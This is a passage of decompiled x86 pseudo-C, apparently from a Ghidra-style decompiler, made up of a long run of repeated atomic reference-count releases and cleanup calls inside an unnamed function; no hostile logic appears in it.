if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1512 = 0x408722;\n                    (**(**ppiStack1508 + 4))();\n                }\n                ppiStack1508 = 0x40872e;\n                fcn.0040f620();\n                iStack1516 = 0x52e800;\n                uStack1512 = 0x408743;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1512 = 0x52e800;\n                    ppiStack1520 = 0x408759;\n                    iStack1516 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1520 = iStack724 + -0x10;\n                piVar6 = iStack724 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1524 = 0x408782;\n                    (**(**ppiStack1520 + 4))();\n                }\n                ppiStack1520 = 0x40878b;\n                fcn.0040f620();\n                iStack1528 = 0x52e800;\n                iStack1524 = 0x4087a0;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1524 = 0x52e800;\n                    ppiStack1532 = 0x4087b3;\n                    iStack1528 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1532 = ppiStack1472 + -0x10;\n                piVar6 = ppiStack1472 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1536 = 0x4087d9;\n                    (**(**ppiStack1532 + 4))();\n                }\n                ppiStack1532 = 0x4087e5;\n                fcn.0040f620();\n                iStack1540 = 0x52e800;\n                iStack1536 = 0x4087fa;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1536 = 0x52e800;\n                    ppiStack1544 = 0x408810;\n                    iStack1540 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1544 = iStack100 + -0x10;\n                piVar6 = iStack100 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1548 = 0x408839;\n                    (**(**ppiStack1544 + 4))();\n                }\n                ppiStack1544 = 0x408842;\n                fcn.0040f620();\n                iStack1552 = 0x52e800;\n                iStack1548 = 0x408857;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1548 = 0x52e800;\n                    ppiStack1556 = 0x40886a;\n                    iStack1552 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1556 = iStack1488 + -0x10;\n                piVar6 = iStack1488 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1560 = 0x408890;\n                    (**(**ppiStack1556 + 4))();\n                }\n                ppiStack1556 = 0x40889c;\n                fcn.0040f620();\n                iStack1564 = 0x52e800;\n                uStack1560 = 0x4088b1;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1560 = 0x52e800;\n                    ppiStack1568 = 0x4088c7;\n                    iStack1564 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1568 = iStack764 + -0x10;\n                piVar6 = iStack764 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1572 = 0x4088f0;\n                    (**(**ppiStack1568 + 4))();\n                }\n                ppiStack1568 = 0x4088f9;\n                fcn.0040f620();\n                iStack1576 = 0x52e800;\n                iStack1572 = 0x40890e;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1572 = 0x52e800;\n                    ppiStack1580 = 0x408921;\n                    iStack1576 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1580 = iStack1504 + -0x10;\n                piVar6 = iStack1504 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1584 = 0x408947;\n                    (**(**ppiStack1580 + 4))();\n                }\n                ppiStack1580 = 0x408953;\n                fcn.0040f620();\n                iStack1588 = 0x52e800;\n                iStack1584 = 0x408968;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1584 = 0x52e800;\n                    ppiStack1592 = 0x40897e;\n                    iStack1588 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1592 = iStack420 + -0x10;\n                piVar6 = iStack420 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1596 = 0x4089a7;\n                    (**(**ppiStack1592 + 4))();\n                }\n                ppiStack1592 = 0x4089b0;\n                fcn.0040f620();\n                iStack1600 = 0x52e800;\n                iStack1596 = 0x4089c5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1596 = 0x52e800;\n                    ppiStack1604 = 0x4089d8;\n                    iStack1600 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1604 = ppiStack1520 + -0x10;\n                piVar6 = ppiStack1520 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1608 = 0x4089fe;\n                    (**(**ppiStack1604 + 4))();\n                }\n                ppiStack1604 = 0x408a0a;\n                fcn.0040f620();\n                iStack1612 = 0x52e800;\n                uStack1608 = 0x408a1f;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1608 = 0x52e800;\n                    ppiStack1616 = 0x408a35;\n                    iStack1612 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1616 = iStack804 + -0x10;\n                piVar6 = iStack804 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1620 = 0x408a5e;\n                    (**(**ppiStack1616 + 4))();\n                }\n                ppiStack1616 = 0x408a67;\n                fcn.0040f620();\n                iStack1624 = 0x52e800;\n                uStack1620 = 0x408a7c;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1620 = 0x52e800;\n                    ppiStack1628 = 0x408a8f;\n                    iStack1624 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1628 = iStack1536 + -0x10;\n                piVar6 = iStack1536 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1632 = 0x408ab5;\n                    (**(**ppiStack1628 + 4))();\n                }\n                ppiStack1628 = 0x408ac1;\n                fcn.0040f620();\n                iStack1636 = 0x52e800;\n                iStack1632 = 0x408ad6;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1632 = 0x52e800;\n                    ppiStack1640 = 0x408aec;\n                    iStack1636 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1640 = iStack284 + -0x10;\n                piVar6 = iStack284 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1644 = 0x408b15;\n                    (**(**ppiStack1640 + 4))();\n                }\n                ppiStack1640 = 0x408b1e;\n                fcn.0040f620();\n                iStack1648 = 0x52e800;\n                iStack1644 = 0x408b33;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1644 = 0x52e800;\n                    ppiStack1652 = 0x408b46;\n                    iStack1648 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1652 = iStack1552 + -0x10;\n                piVar6 = iStack1552 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1656 = 0x408b6c;\n                    (**(**ppiStack1652 + 4))();\n                }\n                ppiStack1652 = 0x408b78;\n                fcn.0040f620();\n                iStack1660 = 0x52e800;\n                uStack1656 = 0x408b8d;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1656 = 0x52e800;\n                    ppiStack1664 = 0x408ba3;\n                    iStack1660 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1664 = iStack844 + -0x10;\n                piVar6 = iStack844 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1668 = 0x408bcc;\n                    (**(**ppiStack1664 + 4))();\n                }\n                ppiStack1664 = 0x408bd5;\n                fcn.0040f620();\n                iStack1672 = 0x52e800;\n                iStack1668 = 0x408bea;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1668 = 0x52e800;\n                    ppiStack1676 = 0x408bfd;\n                    iStack1672 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1676 = ppiStack1568 + -0x10;\n                piVar6 = ppiStack1568 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1680 = 0x408c23;\n                    (**(**ppiStack1676 + 4))();\n                }\n                ppiStack1676 = 0x408c2f;\n                fcn.0040f620();\n                iStack1684 = 0x52e800;\n                iStack1680 = 0x408c44;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1680 = 0x52e800;\n                    ppiStack1688 = 0x408c5a;\n                    iStack1684 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1688 = iStack508 + -0x10;\n                piVar6 = iStack508 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1692 = 0x408c83;\n                    (**(**ppiStack1688 + 4))();\n                }\n                ppiStack1688 = 0x408c8c;\n                fcn.0040f620();\n                iStack1696 = 0x52e800;\n                iStack1692 = 0x408ca1;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1692 = 0x52e800;\n                    ppiStack1700 = 0x408cb4;\n                    iStack1696 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1700 = iStack1584 + -0x10;\n                piVar6 = iStack1584 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1704 = 0x408cda;\n                    (**(**ppiStack1700 + 4))();\n                }\n                ppiStack1700 = 0x408ce6;\n                fcn.0040f620();\n                iStack1708 = 0x52e800;\n                uStack1704 = 0x408cfb;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1704 = 0x52e800;\n                    ppiStack1712 = 0x408d11;\n                    iStack1708 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1712 = iStack884 + -0x10;\n                piVar6 = iStack884 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1716 = 0x408d3a;\n                    (**(**ppiStack1712 + 4))();\n                }\n                ppiStack1712 = 0x408d43;\n                fcn.0040f620();\n                iStack1720 = 0x52e800;\n                iStack1716 = 0x408d58;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1716 = 0x52e800;\n                    ppiStack1724 = 0x408d6e;\n                    iStack1720 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1724 = iStack1600 + -0x10;\n                piVar6 = iStack1600 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1728 = 0x408d94;\n                    (**(**ppiStack1724 + 4))();\n                }\n                ppiStack1724 = 0x408da0;\n                fcn.0040f620();\n                iStack1732 = 0x52e800;\n                iStack1728 = 0x408db5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1728 = 0x52e800;\n                    ppiStack1736 = 0x408dcb;\n                    iStack1732 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1736 = iStack244 + -0x10;\n                piVar6 = iStack244 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1740 = 0x408df4;\n                    (**(**ppiStack1736 + 4))();\n                }\n                ppiStack1736 = 0x408e00;\n                fcn.0040f620();\n                iStack1744 = 0x52e800;\n                iStack1740 = 0x408e15;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1740 = 0x52e800;\n                    ppiStack1748 = 0x408e2b;\n                    iStack1744 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1748 = ppiStack1616 + -0x10;\n                piVar6 = ppiStack1616 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1752 = 0x408e54;\n                    (**(**ppiStack1748 + 4))();\n                }\n                ppiStack1748 = 0x408e60;\n                fcn.0040f620();\n                iStack1756 = 0x52e800;\n                uStack1752 = 0x408e75;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1752 = 0x52e800;\n                    ppiStack1760 = 0x408e8b;\n                    iStack1756 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1760 = iStack924 + -0x10;\n                piVar6 = iStack924 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1764 = 0x408eb4;\n                    (**(**ppiStack1760 + 4))();\n                }\n                ppiStack1760 = 0x408ec0;\n                fcn.0040f620();\n                iStack1768 = 0x52e800;\n                iStack1764 = 0x408ed5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1764 = 0x52e800;\n                    ppiStack1772 = 0x408eeb;\n                    iStack1768 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1772 = iStack1632 + -0x10;\n                piVar6 = iStack1632 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1776 = 0x408f14;\n                    (**(**ppiStack1772 + 4))();\n                }\n                ppiStack1772 = 0x408f20;\n                fcn.0040f620();\n                iStack1780 = 0x52e800;\n                iStack1776 = 0x408f35;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1776 = 0x52e800;\n                    ppiStack1784 = 0x408f4b;\n                    iStack1780 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1784 = iStack596 + -0x10;\n                piVar6 = iStack596 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1788 = 0x408f74;\n                    (**(**ppiStack1784 + 4))();\n                }\n                ppiStack1784 = 0x408f80;\n                fcn.0040f620();\n                iStack1792 = 0x52e800;\n                iStack1788 = 0x408f95;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1788 = 0x52e800;\n                    ppiStack1796 = 0x408fab;\n                    iStack1792 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1796 = iStack1648 + -0x10;\n                piVar6 = iStack1648 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1800 = 0x408fd4;\n                    (**(**ppiStack1796 + 4))();\n                }\n                ppiStack1796 = 0x408fe0;\n                fcn.0040f620();\n                iStack1804 = 0x52e800;\n                uStack1800 = 0x408ff5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1800 = 0x52e800;\n                    ppiStack1808 = 0x40900b;\n                    iStack1804 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1808 = iStack964 + -0x10;\n                piVar6 = iStack964 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1812 = 0x409034;\n                    (**(**ppiStack1808 + 4))();\n                }\n                ppiStack1808 = 0x409040;\n                fcn.0040f620();\n                iStack1816 = 0x52e800;\n                uStack1812 = 0x409055;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1812 = 0x52e800;\n                    ppiStack1820 = 0x40906b;\n                    iStack1816 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1820 = ppiStack1664 + -0x10;\n                piVar6 = ppiStack1664 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1824 = 0x409094;\n                    (**(**ppiStack1820 + 4))();\n                }\n                ppiStack1820 = 0x4090a0;\n                fcn.0040f620();\n                iStack1828 = 0x52e800;\n                iStack1824 = 0x4090b5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1824 = 0x52e800;\n                    ppiStack1832 = 0x4090cb;\n                    iStack1828 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1832 = iStack468 + -0x10;\n                piVar6 = iStack468 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1836 = 0x4090f4;\n                    (**(**ppiStack1832 + 4))();\n                }\n                ppiStack1832 = 0x409100;\n                fcn.0040f620();\n                iStack1840 = 0x52e800;\n                uStack1836 = 0x409115;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1836 = 0x52e800;\n                    ppiStack1844 = 0x40912b;\n                    iStack1840 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1844 = iStack1680 + -0x10;\n                piVar6 = iStack1680 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1848 = 0x409154;\n                    (**(**ppiStack1844 + 4))();\n                }\n                ppiStack1844 = 0x409160;\n                fcn.0040f620();\n                iStack1852 = 0x52e800;\n                uStack1848 = 0x409175;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1848 = 0x52e800;\n                    ppiStack1856 = 0x40918b;\n                    iStack1852 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1856 = iStack1004 + -0x10;\n                piVar6 = iStack1004 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1860 = 0x4091b4;\n                    (**(**ppiStack1856 + 4))();\n                }\n                ppiStack1856 = 0x4091c0;\n                fcn.0040f620();\n                iStack1864 = 0x52e800;\n                uStack1860 = 0x4091d5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1860 = 0x52e800;\n                    ppiStack1868 = 0x4091eb;\n                    iStack1864 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1868 = iStack1696 + -0x10;\n                piVar6 = iStack1696 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1872 = 0x409214;\n                    (**(**ppiStack1868 + 4))();\n                }\n                ppiStack1868 = 0x409220;\n                fcn.0040f620();\n                iStack1876 = 0x52e800;\n                iStack1872 = 0x409235;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1872 = 0x52e800;\n                    ppiStack1880 = 0x40924b;\n                    iStack1876 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1880 = iStack684 + -0x10;\n                piVar6 = iStack684 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1884 = 0x409274;\n                    (**(**ppiStack1880 + 4))();\n                }\n                ppiStack1880 = 0x409280;\n                fcn.0040f620();\n                iStack1888 = 0x52e800;\n                uStack1884 = 0x409295;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1884 = 0x52e800;\n                    ppiStack1892 = 0x4092ab;\n                    iStack1888 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1892 = ppiStack1712 + -0x10;\n                piVar6 = ppiStack1712 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1896 = 0x4092d4;\n                    (**(**ppiStack1892 + 4))();\n                }\n                ppiStack1892 = 0x4092e0;\n                fcn.0040f620();\n                iStack1900 = 0x52e800;\n                uStack1896 = 0x4092f5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1896 = 0x52e800;\n                    ppiStack1904 = 0x40930b;\n                    iStack1900 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1904 = iStack1044 + -0x10;\n                piVar6 = iStack1044 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1908 = 0x409334;\n                    (**(**ppiStack1904 + 4))();\n                }\n                ppiStack1904 = 0x409340;\n                fcn.0040f620();\n                iStack1912 = 0x52e800;\n                uStack1908 = 0x409355;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1908 = 0x52e800;\n                    ppiStack1916 = 0x40936b;\n                    iStack1912 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1916 = iStack1728 + -0x10;\n                piVar6 = iStack1728 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1920 = 0x409394;\n                    (**(**ppiStack1916 + 4))();\n                }\n                ppiStack1916 = 0x4093a0;\n                fcn.0040f620();\n                iStack1924 = 0x52e800;\n                iStack1920 = 0x4093b5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1920 = 0x52e800;\n                    ppiStack1928 = 0x4093cb;\n                    iStack1924 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1928 = iStack476 + -0x10;\n                piVar6 = iStack476 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1932 = 0x4093f4;\n                    (**(**ppiStack1928 + 4))();\n                }\n                ppiStack1928 = 0x409400;\n                fcn.0040f620();\n                iStack1936 = 0x52e800;\n                uStack1932 = 0x409415;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1932 = 0x52e800;\n                    ppiStack1940 = 0x40942b;\n                    iStack1936 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1940 = iStack1744 + -0x10;\n                piVar6 = iStack1744 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1944 = 0x409454;\n                    (**(**ppiStack1940 + 4))();\n                }\n                ppiStack1940 = 0x409460;\n                fcn.0040f620();\n                iStack1948 = 0x52e800;\n                uStack1944 = 0x409475;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1944 = 0x52e800;\n                    ppiStack1952 = 0x40948b;\n                    iStack1948 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1952 = iStack1084 + -0x10;\n                piVar6 = iStack1084 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1956 = 0x4094b4;\n                    (**(**ppiStack1952 + 4))();\n                }\n                ppiStack1952 = 0x4094c0;\n                fcn.0040f620();\n                iStack1960 = 0x52e800;\n                uStack1956 = 0x4094d5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1956 = 0x52e800;\n                    ppiStack1964 = 0x4094eb;\n                    iStack1960 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1964 = ppiStack1760 + -0x10;\n                piVar6 = ppiStack1760 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1968 = 0x409514;\n                    (**(**ppiStack1964 + 4))();\n                }\n                ppiStack1964 = 0x409520;\n                fcn.0040f620();\n                iStack1972 = 0x52e800;\n                iStack1968 = 0x409535;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack1968 = 0x52e800;\n                    ppiStack1976 = 0x40954b;\n                    iStack1972 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1976 = iStack772 + -0x10;\n                piVar6 = iStack772 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1980 = 0x409574;\n                    (**(**ppiStack1976 + 4))();\n                }\n                ppiStack1976 = 0x409580;\n                fcn.0040f620();\n                iStack1984 = 0x52e800;\n                uStack1980 = 0x409595;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1980 = 0x52e800;\n                    ppiStack1988 = 0x4095ab;\n                    iStack1984 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack1988 = iStack1776 + -0x10;\n                piVar6 = iStack1776 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1992 = 0x4095d4;\n                    (**(**ppiStack1988 + 4))();\n                }\n                ppiStack1988 = 0x4095e0;\n                fcn.0040f620();\n                iStack1996 = 0x52e800;\n                uStack1992 = 0x4095f5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack1992 = 0x52e800;\n                    ppiStack2000 = 0x40960b;\n                    iStack1996 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2000 = iStack1124 + -0x10;\n                piVar6 = iStack1124 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2004 = 0x409634;\n                    (**(**ppiStack2000 + 4))();\n                }\n                ppiStack2000 = 0x409640;\n                fcn.0040f620();\n                iStack2008 = 0x52e800;\n                uStack2004 = 0x409655;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2004 = 0x52e800;\n                    ppiStack2012 = 0x40966b;\n                    iStack2008 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2012 = iStack1792 + -0x10;\n                piVar6 = iStack1792 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack2016 = 0x409694;\n                    (**(**ppiStack2012 + 4))();\n                }\n                ppiStack2012 = 0x4096a0;\n                fcn.0040f620();\n                iStack2020 = 0x52e800;\n                iStack2016 = 0x4096b5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    iStack2016 = 0x52e800;\n                    ppiStack2024 = 0x4096cb;\n                    iStack2020 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2024 = iStack652 + -0x10;\n                piVar6 = iStack652 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2028 = 0x4096f4;\n                    (**(**ppiStack2024 + 4))();\n                }\n                ppiStack2024 = 0x409700;\n                fcn.0040f620();\n                iStack2032 = 0x52e800;\n                uStack2028 = 0x409715;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2028 = 0x52e800;\n                    ppiStack2036 = 0x40972b;\n                    iStack2032 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2036 = ppiStack1808 + -0x10;\n                piVar6 = ppiStack1808 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2040 = 0x409754;\n                    (**(**ppiStack2036 + 4))();\n                }\n                ppiStack2036 = 0x409760;\n                fcn.0040f620();\n                iStack2044 = 0x52e800;\n                uStack2040 = 0x409775;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2040 = 0x52e800;\n                    ppiStack2048 = 0x40978b;\n                    iStack2044 = iVar5;\n                    fcn.0040f770();\n                }\n                ppiStack2048 = iStack1164 + -0x10;\n                piVar6 = iStack1164 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack2052 = 0x4097b4;\n                    (**(**ppiStack2048 + 4))();\n                }\n                ppiStack2048 = 0x4097c0;\n                fcn.0040f620();\n                iStack2056 = 0x52e800;\n                uStack2052 = 0x4097d5;\n                iVar5 = fcn.00423f8f();\n                if (iVar5 != 0) {\n                    uStack2052 = 0x52e800;\n                    ppiStack2060 = 0x4097eb;\n                    